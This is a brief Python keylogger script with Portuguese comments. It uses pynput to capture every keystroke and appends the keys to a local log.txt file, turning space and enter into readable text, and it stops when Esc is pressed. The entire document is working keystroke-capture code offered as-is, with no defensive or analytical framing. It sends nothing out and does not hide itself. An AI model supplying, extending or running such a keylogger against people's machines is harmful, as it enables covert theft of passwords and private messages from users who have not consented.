import pynput

from pynput.keyboard import Key, Listener

count = 0
keys =[]

def on_press(key): # responsavel capturar a tecla e chamar a função de escrita (write_file)
    global keys,count
    keys.append(key)
    count +=1

    if count >= 2: #otimização boba
        count = 0
        write_file(keys)
        keys=[]
def write_file(keys): #cria log.txt no diretorio desejado ( default = mesma pagina do projeto do arquivo)
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")  # Deixa o log mais bonito
            if k.find("space") > 0: # Deixa o log mais bonito
                f.write(' ')
            if k.find("enter") > 0: # Deixa o log mais bonito
                f.write('\n')

            elif k.find("Key") == -1:
                f.write(k)

def on_release(key): # condição para fechar o programa
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release = on_release) as Listener: # responsavel por "monitorar" informações digitadas
    Listener.join()
